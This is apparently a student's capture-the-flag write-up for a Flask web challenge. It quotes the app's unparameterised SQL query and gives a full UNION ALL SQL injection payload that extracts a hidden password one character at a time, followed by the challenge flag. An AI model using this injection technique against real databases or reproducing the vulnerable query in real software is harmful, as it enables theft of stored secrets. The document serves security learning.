Custom Challenges
Web exploitation


# 1. One shot
- crack the flask based web server to obtain the flag
## Solution:
- this is a webserver to be cracked using sqli vulnerability 
- it sets up a session creating a table and inserts random 32 character hex pass and we can only use search once per session ID and searched column will be set to 1 blocking further attempts and the output is masked so only the first charcter will be shown and rest wil be represented by asterisk and we shall provide excat 32 char pass to recieve the flag
```
query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
```
- vulnerability is in `/search` since request.form becomes a string we can break out and excute our own commands.
- so another shot is if row contains only 1 char the masking logic returns 1 char and no asterisks so we can use UNIONALL to force the database to retunr 32 seperate rows each row containing one char of the password
```
%' UNION ALL SELECT substr(password,1,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,2,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,3,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,4,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,5,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,6,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,7,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,8,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,9,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,10,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,11,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,12,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,13,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,14,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,15,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,16,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,17,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,18,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,19,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,20,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,21,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,22,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,23,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,24,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,25,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,26,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,27,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,28,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,29,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,30,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,31,1) FROM table_773e07626d5ed376 UNION ALL SELECT substr(password,32,1) FROM table_773e07626d5ed376 --
```
- it selects password from table where % breaks out from intended search and noe UNIONALL combines results and tell the databse using substr give the string at position i with lenght 1 and -- at the end cleans up the sql comment.
## Flag:
```
nite{are_you_feeling_the_heat_now :)}
```
## Concepts learnt:
- more knowledge about sqli to access the database of the webpage
## Resources:
- [about sql injection](https://portswigger.net/web-security/sql-injection)(https://portswigger.net/web-security/sql-injection/lab-login-bypass)
- [sql injection sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)(https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [sql payload list](https://github.com/payloadbox/sql-injection-payload-list)
- [sql youtube playlist](https://www.youtube.com/watch?v=1nJgupaUPEQ&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&pp=0gcJCa4EOCosWNin)
- [about sql](https://www.w3schools.com/sql/sql_comments.asp)
***